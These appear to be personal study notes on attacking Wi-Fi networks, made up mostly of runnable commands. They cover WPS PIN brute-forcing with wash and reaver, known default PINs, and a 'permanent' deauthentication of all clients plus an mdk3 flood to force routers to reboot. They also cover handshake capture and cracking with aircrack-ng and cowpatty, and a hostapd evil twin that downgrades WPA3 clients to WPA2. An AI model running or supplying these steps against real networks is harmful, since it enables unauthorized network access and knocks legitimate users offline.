## WPA/WPA2
https://www.youtube.com/watch?v=Ra0dGPYScLQ


Before trying to crack WPA find out if WPS is enabled, which is easier to crack

### WPS
Method to authenticate to WPA without the passphrase, only with a 8 character ping. It can be cracked faster because of its length, and once obtained, the WPA/WPA2 passphrase can be automatically recovered.

Requirements (hard to find nowadays)
- WPS must be enabled
- WPS must be using ``pin authentication`` and not PBC (Push Button Configuration). With option, a physical button in the router must be pushed to activate the use of WPS for some time interval. PBC usually is active by default in modern routers, or WPS is directly disabled by default.

```bash
# Find APs with WPS activated (exit with ctrl-C)
wash --interface wlan0mon  
wash -i wlan0mon  
# scan 5GHz band
wash -i wlan0mon -5
# The Lck column says if WPS is locked (sometimes WPS gets locked after some failed attempts). WPS version 2 includes mitigations against brute force, but depending on the implementation it may only slow it down.

# The next command brute forces WPS pins, online cracking similar to hydra (-vvv for verbose, --no-associate if we have previously associated with aireplay-ng --fakeauth)
reaver -b <AP bssid> -i wlan0mon -v
reaver --bssid <AP bssid> --channel <AP channel> --interface wlan0mon -vvv --no-associate

# Pixie attack (-K), faster than the regular brute force, but doesn't always work, depends on the AP PRGA 
reaver -b <AP BSSID> -i wlan0mon -v -K

# When the previous command is sent it stays waiting if we are not associated with the AP. We can do it with aireplay, so that the AP doesn't ignore the future packets that we will send (instead of 0 we can use a certain number of seconds to be associated)
sudo aireplay-ng --fakeauth 30 -a <AP bssid> -h <our own MAC> wlan0mon
```
Reaver outputs the WPS pin if it can find it, and thanks to it it also retrieves the passphrase (WPA-PSK), which we can use to connect to the network. Even if it finds it, it's an slow attack, it can take a few hours to complete, depending on the router AP configuration and the value of the pin (if it's one of the last ones reaver tries)

These attacks usually fail, there are several possible sources of problems. Reaver can say that the AP is deauthenticating us, among other error messages. If WPS cracking doesn't work right away it probably won't work at all. Even if an AP's WPS is not locked the attacks can fail for other reasons. For example, some routers timeout WPS after a short time since it was activated.

There are APs that don't use a pin. With bully and reaver we can use the ``-p ''`` option to check if the pin is empty

Some APs use a pin that is linked to the first three bytes of the BSSID. Airgeddon contains them in known_pins.db

To check if a certain BSSID has known default pins, use the first three bytes of the AP (without the colon symbols, in this case XXYYZ for a BSSID= XX:YY:ZZ:AA:BB:CC)

```
source /usr/share/airgeddon/known_pins.db
echo ${PINDB["XXYYZZ"]}
14755989 48703970 06017637
```

Try manually the pins returned, if any

troubleshooting the reaver:
1- If it says it cannot associate with the AP -> we need to associate manually with aireplay-ng --fakeauth in another terminal, and keep the fake auth running while we try the reaver attack (which we must run with the -A option, so that it doesn't try to associate itself to the AP, since we already are associated via aireplay-ng)

2- Reaver says WPS transaction failed, re-trying last ping (we can see this with -vvv for debugging output). Then it retries the same pin all the time. Sometimes (we can see in the output) this is due to the use of NACK packets. We can try with the option -N (or --no-nacks) to not send them.

3- If reaver says "Waiting for beacon from XX:XX:XX:XX:XX:XX" we need to specify the channel manually (-c parameter) 

4- The AP can have rate limiting enabled, and change state to locked (Lck) after some failed attempts. If we suspect the AP locked WPS, run ``wash`` again to check if it's in the Lck state. We can deauthenticate permanently all clients connected, so that someone complains or restarts the AP, so that we can continue bruteforcing pins. This is very clumsy and noisy, and if the rate limiting occurs fast it's probably going to be useless, as we will quickly lock WPS again.
We can run this "permanent" deauth with
``sudo aireplay-ng --deauth 1000000000000 -a <AP bssid> wlan0mon``

We can also try the ``mdk3`` tool, which can cause DoS to some routers and perhaps force them to restart. Some routers unlock WPS when they restart

```bash
# DoS to an AP, with different MACs, as if it were a DDoS. Some routers reboot when too many different MACs try to connect to them because they cannot handle so many connections

# Help of the "a" option of mdk3 (used for DoS) withs
mdk3 --help a 

# DoS (-m for using real looking MACs, not arbitrary ones like 00:00:00:00:00:00)
mdk3 wlan0mon a -a <AP BSSID> -m
```
Clients connect in amounts of 500 and it may say that it is vulnerable, or it may not say it. When we reach about 10000 stop ``mdk3`` and use ``wash`` to check if WPS got unlocked (if the AP rebooted it will take a while before we can get useful output from ``wash``)


- karma attack: the fake AP listens to probes sent by clients when they search for known APs and responds, telling them that he is the AP they are looking for


### WPA/WPA2 cracking
WPA-> TKIP (based on WEP). WPA only required firmware update, for that reason it was accepted quickly
WPA2 -> CCMP (based on AES). WPA2 needs new hardware to compute AES faster

```bash
# Run the following and wait for a handshake by a new client connecting to the network
sudo airodump-ng --bssid <AP bssid> --channel <channel> --write <cap file> wlan0mon

# We can also deauthenticate a client to force him to reconnect (we should see in the top right corner of the airodump-ng output tha ta handshake has been captured. I have problems with this in a VM, but not on a baremetal linux)
sudo aireplay-ng --deauth 4 -a <AP bssid> -c <client MAC> wlan0mon

# Crack the capture file
aircrack-ng <file.cap> -w <wordlist.txt>
```

Cracking is time consuming because of the computation of the PBKDF2 function (4096 iterations for AES). A rainbow table can be precomputed:

``genpmk -f <wordlist> -d precomputed-common -s home``
And we can crack with a rainbow table attack:
``cowpatty -d <precomputed wordlist> -s <ESSID> -r <capture file.cap>``


```bash
# Create the <output db> database 
airolib-ng <output db> --import passwd <wordlist>

# save to a file the ESSID that we want to crack
echo "<essid>" > <essid file>

# Import the ESSID in the DB
airolib-ng <output db> --import essid <essid file>

# Create a PMK for every password in the list
airolib-ng <output db> --batch

# Crack
aircrack-ng -r <output db> <file.cap>
```

### AP-less networks
If we see a client probing for a network but the network is not there, probably it's using WPA/WPA2, we can create a honeypot with that network name and capture traffic with airodump, so that when he tries to connect to us we capture a handshake that we can try to crack


### WPA3
It is not possible to crack WPA3. But we can try downgrade clients to WPA2 to capture a crackable handshake. This can be done with an evil twin with only WPA2 and 802.11w set to "optional".

If 802.11w is disabled, a client may never try to connect, but WPA2 clients rarely use it (and sometimes don't handle it well). The combination of only using WPA2 and 802.11w set to "optional" will gives us the highest chance that a client will be willing to downgrade.

To achieve this in the hostapd configuration:
- _wpa_ value should be set to "2"
- there shouldn't be a _wpa_pairwise_ parameter
- rsn_pairwise should be set to "CCMP" only
- To enable 802.11w, we would set _ieee80211w_ as a new parameter with the value of "1" (indicating it is optional). 
- The latter also requires that we add "WPA-PSK-SHA256" to _wpa_key_mgmt_.